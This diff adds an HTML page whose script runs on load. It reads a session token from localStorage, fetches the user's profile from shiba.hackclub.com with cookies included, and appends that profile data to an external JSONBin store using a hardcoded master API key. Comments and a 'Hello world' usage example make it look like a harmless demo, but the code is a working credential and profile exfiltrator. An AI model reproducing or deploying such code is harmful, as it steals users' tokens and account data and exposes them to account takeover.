@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+	<body>
+		<script>
+			async function appendToJsonBin(newItem) {
+			const BIN_ID = "68ae3aec43b1c97be92bfaa9";       // <-- replace with your bin ID
+			const API_KEY = "$2a$10$1Z8onRyu5z04DcR7.C8BReAJ1E74akMHT1VFCDBRZPzRqKHVfv/Dm";  // <-- replace with your master key
+
+			const yourKey = localStorage.getItem("key");
+
+  			const url = "https://shiba.hackclub.com/api/getMyProfile";
+
+			const bodyData = {
+				token: JSON.stringify(yourKey)
+			};
+
+			const response = await fetch(url, {
+				method: "POST",
+				headers: {
+					"Content-Type": "application/json",
+					"Accept": "*/*",
+					"Origin": "https://shiba.hackclub.com",
+					"Referer": "https://shiba.hackclub.com/my-games"
+				},
+				body: JSON.stringify(bodyData),
+				credentials: "include" // sends cookies if running on same origin
+			});
+
+			const data = await response.json();
+
+			newItem = yourKey
+
+			  try {
+			    // 1️⃣ Fetch current contents
+			    const currentRes = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, {
+			      headers: { "X-Master-Key": API_KEY },
+			    });
+
+			    const currentJson = await currentRes.json();
+			    let currentData = currentJson.record;
+
+			    // Ensure it's an array
+			    if (!Array.isArray(currentData)) {
+			      currentData = [];
+			    }
+
+			    // 2️⃣ Append new item
+			    currentData.push(data);
+
+			    // 3️⃣ PUT updated array back
+			    const updateRes = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
+			      method: "PUT",
+			      headers: {
+				"Content-Type": "application/json",
+				"X-Master-Key": API_KEY,
+				"X-Bin-Versioning": "false",
+			      },
+			      body: JSON.stringify(currentData),
+			    });
+
+			    const updateJson = await updateRes.json();
+			    console.log("Appended successfully:", updateJson);
+			    return updateJson;
+			  } catch (err) {
+			    console.error("Error appending to JSONBin:", err);
+			  }
+			}
+
+			// Usage example:
+			appendToJsonBin({ message: "Hello world", timestamp: Date.now() });
+			
+		</script>
+	</body>
+</html>
